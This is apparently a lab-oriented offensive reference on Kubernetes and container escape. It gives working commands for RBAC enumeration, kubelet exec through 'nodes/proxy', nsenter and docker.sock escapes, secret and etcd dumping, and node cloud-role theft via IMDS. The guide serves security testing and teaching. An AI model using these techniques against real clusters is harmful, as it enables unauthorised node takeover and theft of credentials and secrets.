# Kubernetes and container escape

You are here because code is executing inside a pod, or because a host is
running a cluster (k3s, kubeadm, microk8s) and you have a shell on it. The
question is always the same: **what does this identity let me do to the node?**

Almost every lab k8s escape is one of three things — a service account with too
much RBAC, a pod that runs privileged, or a kubelet that answers to a token it
should not. Enumerate in that order.

## Am I in a container?

```bash
ls /.dockerenv 2>/dev/null; cat /proc/1/cgroup; cat /proc/self/mountinfo | head
env | grep -i kubernetes           # KUBERNETES_SERVICE_HOST => in a pod
ls /var/run/secrets/kubernetes.io/serviceaccount/
```

Signals worth reading carefully:

- **`CapEff` in `/proc/self/status`.** `0000003fffffffff` (or anything with
  `cap_sys_admin`) means privileged. All zeros means a dropped-caps pod — but
  `CapBnd` being full still tells you the runtime did not restrict the bounding
  set, which matters if you can get a setuid binary.
- **Host mounts.** `mount | grep -E '/host|hostPath'`. A container that can see
  `/host/root`, `/host/proc` or the containerd state directory is one command
  from the node.
- **`/proc/1/root` readable** means `hostPID` or a shared PID namespace.

## Node-side: a shell on a k3s/kubeadm host

The prize is the admin kubeconfig, which is root-only by default:

```bash
ls -la /etc/rancher/k3s/k3s.yaml            # k3s   (0600 root)
ls -la /etc/kubernetes/admin.conf           # kubeadm
ls -la /var/lib/rancher/k3s/server/token /etc/rancher/node/password
```

If they are readable, you are done — `kubectl --kubeconfig=… get nodes`. If they
are not, note which ports are listening; they map the cluster's shape and tell
you what to attack from inside a pod later:

```
6443   kube-apiserver          10250  kubelet (read + exec)
10259  kube-scheduler          10256  kube-proxy health
10257  kube-controller-manager 6444   k3s supervisor
```

`kubectl`, `crictl`, `helm` and `docker` being present but permission-denied is
normal and is not a dead end — it means the cluster is there and you need an
identity, not a binary.

## In-pod: enumerate the service account's RBAC

Never guess what the token can do. Ask the API:

```bash
SA=/var/run/secrets/kubernetes.io/serviceaccount
TOK=$(cat $SA/token); NS=$(cat $SA/namespace); API=https://$KUBERNETES_SERVICE_HOST

# everything this SA may do in its namespace
curl -sk -X POST $API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' \
  -d "{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",
       \"spec\":{\"namespace\":\"$NS\"}}"
```

`SelfSubjectRulesReview` covers namespaced rules. For cluster-scoped verbs, probe
individually with `SelfSubjectAccessReview` (same shape, `resourceAttributes`
with `verb`/`resource`/`subresource`). Both are almost always allowed — they are
in the default `system:basic-user` role — so this works even when nothing else
does. `kubectl auth can-i --list` does the same thing when kubectl is present.

Verbs worth probing explicitly, roughly in order of how much they give you:

| verb / resource | what it is worth |
|---|---|
| `*` on `*` | cluster admin |
| `create pods` | schedule a privileged pod with hostPath `/` → node root |
| `create pods/exec` | exec into an existing privileged pod |
| `get/list secrets` | service account tokens for better identities |
| `create serviceaccounts/token` | mint a token for a better SA |
| **`get nodes/proxy`** | **the kubelet API — including exec (see below)** |
| `get pods/log` | logs may carry credentials |

## `get nodes/proxy` is exec, not just reads

This is the one people under-rate. `nodes/proxy` proxies arbitrary kubelet
requests through the apiserver, and the kubelet's `exec` endpoint is authorized
as the `proxy` **subresource** — so a `get` on `nodes/proxy` reaches it.

```bash
N=<node-name>; P=/api/v1/nodes/$N/proxy
curl -sk -H "Authorization: Bearer $TOK" $API$P/pods          # every pod spec on the node
curl -sk -H "Authorization: Bearer $TOK" $API$P/runningpods/
curl -sk -H "Authorization: Bearer $TOK" $API$P/configz       # kubelet config, cred file paths
curl -sk -H "Authorization: Bearer $TOK" $API$P/logs/         # file read under /var/log
curl -sk -H "Authorization: Bearer $TOK" $API$P/metrics/cadvisor
```

**Read the response code, not just the body.** A `GET` to
`/exec/<ns>/<pod>/<container>` that returns **`500 Upgrade request required`**
means authorization *passed* and only the streaming upgrade is missing. `403` is
a real denial; `500 Upgrade required` is an invitation.

`/logs/` is a genuine file-read primitive, but it is chrooted to `/var/log` —
the apiserver normalises `..` and the kubelet rejects encoded slashes, so
traversal out of it does not work. Do not spend time on it; go for exec.

### Finishing exec over WebSocket

`POST` to exec needs `create nodes/proxy`. With only `get`, drive it as a
WebSocket instead. From the node itself the kubelet is directly reachable on
`:10250` with the same token.

- Handshake: `GET /exec/<ns>/<pod>/<container>?command=…&command=…&output=1&error=1`
  with `Upgrade: websocket`, `Sec-WebSocket-Key`, `Sec-WebSocket-Version: 13`
  and `Sec-WebSocket-Protocol`.
- **Try `v5.channel.k8s.io` first; if it 403s, use `v4.channel.k8s.io`.** A 403
  on v5 alone is not a denial of exec.
- Frames are standard WebSocket. Server→client frames are unmasked, and the
  **first byte of each payload is the channel**: `1` stdout, `2` stderr,
  `3` status (a JSON `Status` object with the exit code).
- One `command=` query parameter per argv element, URL-encoded.

Python's stdlib is enough — `socket` + `ssl` + a 30-line frame parser. No stdin
means you never need client-side masking.

## Picking the exec target: read every pod spec

`$P/pods` gives you the full spec of everything on the node. Triage on:

```
securityContext.privileged: true      runAsUser: 0
hostPID / hostNetwork / hostIPC: true
volumes[].hostPath.path: /            (or /var/run/docker.sock, /var/lib/kubelet)
```

Monitoring and logging DaemonSets are the usual offenders — `node-exporter`,
`fluentd`, `filebeat`, `datadog-agent`, CNI and CSI pods. A `node-exporter` that
was installed with `privileged: true` and host `/` mounted at `/host/root` is
node root for anyone who can exec into it.

## Escaping the container once you are in a privileged pod

With `hostPID` + privileged + uid 0, PID 1 is the host's init, so `nsenter` into
its namespaces:

```bash
nsenter -t 1 -m -u -i -n -p -- /bin/bash
```

**When the container is distroless** — no shell, no `nsenter`, no libc layout you
recognise — use the host's binaries through the host mount. Invoke the host's
dynamic loader explicitly so its `nsenter` finds the host's libraries:

```bash
/host/root/lib64/ld-linux-x86-64.so.2 \
  --library-path /host/root/usr/lib/x86_64-linux-gnu:/host/root/lib/x86_64-linux-gnu:/host/root/lib64 \
  /host/root/usr/bin/nsenter -t 1 -m -u -i -n -p -- /bin/bash -c '<cmd>'
```

Other escapes, in rough order of how often they are the intended path:

- **`/var/run/docker.sock` mounted** → `docker run -v /:/host --privileged` and
  read the host from `/host`. Also reachable over HTTP with `curl --unix-socket`.
- **`CAP_SYS_ADMIN` without hostPID** → cgroup v1 `release_agent` escape.
- **host `/` mounted read-only** still gives you file *read* of the node —
  `/etc/shadow`, kubeconfigs, SSH keys, `/root`. `mountPropagation:
  HostToContainer` does not make it writable, but plenty is winnable read-only.
- **`create pods` RBAC** → just schedule your own privileged pod:
  `hostPID: true`, `privileged: true`, `hostPath: /`, `nodeName` pinned, then
  exec into it.

The generic, non-Kubernetes escape primitives (socket, caps, cgroup, device) are
catalogued in `references/containers.md` — this section is the Kubernetes-shaped
subset.

## High-value cluster reads

- **Secrets** — `kubectl get secrets -A -o yaml` (or the SA's namespace) once
  RBAC allows it: service-account tokens, registry pulls, DB passwords, TLS keys
  all live here base64-encoded.
- **etcd** — a reachable etcd (`2379`) with the client certs (often on the node
  under `/etc/kubernetes/pki/etcd`) is the entire cluster state, secrets
  included: `etcdctl --endpoints=... get / --prefix --keys-only`.
- **Cloud-managed clusters (EKS/AKS/GKE)** — a pod that reaches the node IMDS
  (`169.254.169.254`) can steal the *node's* cloud role and pivot out of the
  cluster into the cloud account. See `references/cloud.md`.

## Cleaning up

State you created in a cluster is not in `/tmp` and will not disappear on its
own. Track and remove:

- pods, deployments, service accounts, (cluster)roles and bindings you created
- in-memory state in an app you exploited (a tool registry, a plugin store) —
  if the app has no delete API, `kubectl rollout restart deploy/<name>` restores
  it, and that is a legitimate cleanup, not a disruption
- SUID binaries and staging directories you dropped on the **node**, which
  survive the pod

Verify each removal rather than assuming it worked, and never delete cluster
audit logs.
